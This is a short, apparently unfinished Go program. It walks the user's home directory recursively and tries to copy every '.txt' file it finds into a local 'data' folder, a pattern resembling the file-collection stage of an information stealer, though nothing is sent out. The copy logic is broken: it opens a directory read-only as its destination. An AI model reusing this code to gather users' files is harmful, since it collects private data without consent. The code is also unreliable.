package main

import (
	"io"
	"log"
	"os"
	"strings"
)

func main() {
	home, err := os.UserHomeDir()
	if err != nil {
		log.Fatalln(err)
	}
	dis, err := os.Getwd()
	if err != nil {
		log.Fatalln(err)
	}
	dis_folder := dis + "/data"
	ListDir(home, dis_folder)
}

func ListDir(Name string, dis_folder string) {

	list, err := os.ReadDir(Name)
	if err != nil {
		log.Println(err)
	}
	for _, i := range list {
		if !i.IsDir() && strings.Contains(i.Name(), ".txt") {
			err := os.Chdir(Name)
			if err != nil {
				log.Fatalln(err)
			}
			fs, err := os.Open(i.Name())
			if err != nil {
				log.Fatalln(err)
			}
			defer fs.Close()
			// copy ?
			dis, err := os.Open(dis_folder)
			if err != nil {
				log.Fatalln(err)
			}
			io.Copy(dis, fs)

		} else if i.IsDir() == true {
			ListDir(Name+"/"+i.Name(), dis_folder)
		}
	}
}
